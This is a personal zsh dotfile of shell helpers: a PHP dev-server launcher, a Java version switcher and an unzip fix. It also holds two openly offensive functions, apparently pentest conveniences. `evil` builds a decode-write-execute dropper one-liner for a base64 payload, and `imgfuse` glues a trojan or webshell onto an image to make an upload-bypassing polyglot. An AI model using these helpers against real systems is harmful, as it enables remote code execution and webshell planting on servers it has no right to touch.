# Veno's personal interactive zsh additions.
#
# Sourced at the end of programs.zsh.initContent by modules/shell/zsh.nix. These
# are convenience wrappers rather than environment setup, so they are kept in a
# plain shell file instead of a Nix string: the escaping required to embed this
# much shell in Nix is a maintenance hazard.
#
# Anything platform-specific guards itself here, because this file is shared by
# every veno host that imports modules/shell/zsh.nix.

function mphp() {
    local port=8000
    local recursive=false
    local positional_args=()

    # 1. 解析参数
    while [[ $# -gt 0 ]]; do
        case $1 in
            -r|--recursive)
                recursive=true
                shift
                ;;
            *)
                positional_args+=("$1")
                shift
                ;;
        esac
    done

    # 如果提供了数字参数，则视为端口
    [[ -n "${positional_args[1]}" ]] && port="${positional_args[1]}"

    local local_ip=$(ipconfig getifaddr en0 2>/dev/null || hostname -I | awk '{print $1}')
    local host="localhost"

    echo "\e[1;32m--- PHP Development Server ---\e[0m"
    echo "Document root: \e[33m$(pwd)\e[0m"
    [[ "$recursive" == true ]] && echo "Mode: \e[35mRecursive Search\e[0m"

    echo "Available PHP Links:"

    # 2. 根据模式查找文件
    local find_cmd
    if [[ "$recursive" == true ]]; then
        # 递归查找，排除常见的大型目录以防刷屏
        find_cmd=$(find . -type f -name "*.php" -not -path "*/vendor/*" -not -path "*/.*/*" | sed 's|^\./||')
    else
        # 仅限当前目录
        find_cmd=$(find . -maxdepth 1 -type f -name "*.php" | sed 's|^\./||')
    fi

    # 3. 打印链接
    if [[ -z "$find_cmd" ]]; then
        echo "  \e[90m(No .php files found)\e[0m"
        echo "  Main URL: \e[1;34mhttp://${host}:${port}\e[0m"
    else
        echo "$find_cmd" | while read -r file; do
            # 对 URL 进行简单的路径编码转换（处理空格等）
            local encoded_file=$(echo "$file" | sed 's/ /%20/g')
            printf "  \e[32m➜\e[0m %-20s \e[1;34mhttp://%s:%s/%s\e[0m\n" "$file" "$host" "$port" "$encoded_file"
        done
    fi

    if [[ -z "$local_ip" ]]; then
        echo "Network Access: \e[1;34mhttp://${local_ip}:${port}\e[0m"
    fi
    
    echo "\e[1;32m-------------------------------\e[0m"
    echo "Press Ctrl+C to stop."
    
    # 4. 启动服务器
    php -S 0.0.0.0:${port}
}

# Java version management function
function jv() {
    # `; }` rather than ` }` so the file also parses under shellcheck (bash).
    [[ "$(uname)" != "Darwin" ]] && { echo "unsupported" >&2; return 1; }

    if [[ $# -eq 0 ]]; then
        local current_version current_path
        current_version=$(java -version 2>&1 | head -1)
        current_version="${current_version#*\"}"
        current_version="${current_version%%\"*}"
        current_path="${JAVA_HOME:-$(/usr/libexec/java_home)}"

        echo "Current:  $current_version  $current_path"
        echo ""
        echo "Available:"

        /usr/libexec/java_home -V 2>&1 | awk '
        NR==1 || /^$/ || /^\// { next }
        {
            version = $1
            arch = $2
            gsub(/[()]/, "", arch)
            vendor = ""
            for(i=4; i<=NF; i++) {
                if ($i == "-") { i++; break }
            }
            for(; i<=NF; i++) {
                if ($i ~ /\/Library\/Java/) {
                    path = $i
                    break
                }
                if (vendor != "") vendor = vendor " "
                vendor = vendor $i
            }
            gsub(/"/, "", vendor)
            printf "  %-8s  %-6s  %-15s  %s\n", version, arch, vendor, path
        }'
        return 0
    fi

    local target_version="$1"
    local java_home

    java_home=$(/usr/libexec/java_home -v "$target_version" 2>/dev/null)

    if [[ -z "$java_home" ]]; then
        echo "Version not found: $target_version" >&2
        return 1
    fi

    export JAVA_HOME="$java_home"
    export PATH="$JAVA_HOME/bin:$PATH"

    echo "Switched to: $java_home"
}


function evil() {
    if [[ -z "$1" ]]; then
        echo "用法: evil <文件路径>"
        return 1
    fi

    local file_path=$1
    local target_path="/tmp/foobar"

    # 检查文件是否存在
    if [[ ! -f "$file_path" ]]; then
        echo "错误: 文件 $file_path 不存在。"
        return 1
    fi

    # 生成 Base64 编码（去除换行符）
    local b64_content=$(base64 -w 0 "$file_path" 2>/dev/null || base64 "$file_path" | tr -d '\n')

    # 构造最终指令
    local cmd="echo '$b64_content' | base64 -d > $target_path ; chmod 555 $target_path ; nohup $target_path &"

    # 输出结果
    echo "$cmd"
}

# 生成 1 像素图片的函数
# 用法: genpix <格式> (例如: genpix png, genpix jpg)
genpix() {
    local format=$1
    if [[ -z "$format" ]]; then
        echo "用法: genpix <format> (例如: png, jpg, gif)" >&2
        return 1
    fi

    # 使用 ImageMagick 创建 1x1 像素的透明(或白色)图片
    # -size 1x1: 尺寸
    # canvas:white: 白色画布
    # fd:1: 输出到标准输出 (stdout)
    magick -size 1x1 canvas:white "${format}:fd:1"
}

# 增强版的 imgfuse，支持从标准输入读取图片
imgfuse() {
    # 如果没有参数且没有管道输入，显示用法
    if [[ $# -lt 1 ]]; then
        echo "用法 1 (管道): genpix png | imgfuse <木马路径> [输出名]"
        echo "用法 2 (文件): imgfuse <图片路径> <木马路径> [输出名]"
        return 1
    fi

    local shell_in
    local output
    local temp_img="/tmp/tmp_pix_$(date +%s)"

    if [[ -p /dev/stdin ]]; then
        # 处理管道输入 (例如 genpix 传过来的数据)
        shell_in=$1
        output=${2:-"fused_payload"}
        cat > "$temp_img"
        cat "$temp_img" "$shell_in" > "$output"
        rm "$temp_img"
    else
        # 处理传统文件输入
        local img_in=$1
        shell_in=$2
        output=${3:-"fused_${img_in}"}
        cat "$img_in" "$shell_in" > "$output"
    fi

    echo "✅ 注入完成! 输出文件: $output" >&2
}


# === 中文 zip 解压修复 ===
# macOS 自带 unzip 遇到 GBK 编码的中文文件名会乱码，这里用 tar(bsdtar) 代替，
# 它能自动识别 GBK/UTF-8 编码。GNU tar 读不了 zip，所以只在 Darwin 上覆盖 unzip，
# 其它平台保留系统 unzip。
if [[ "$(uname)" == Darwin ]]; then
  unzip() {
    case "$1" in
      -l|--list) tar -tf "${@:2}" ;;          # unzip -l 文件.zip  列出内容
      -d) local dest="$2"; shift 2
          mkdir -p "$dest" && tar -xf "$1" -C "$dest" ;;  # unzip 文件.zip -d 目录
      *) tar -xf "$@" ;;                      # unzip 文件.zip    解压到当前目录
    esac
  }
fi
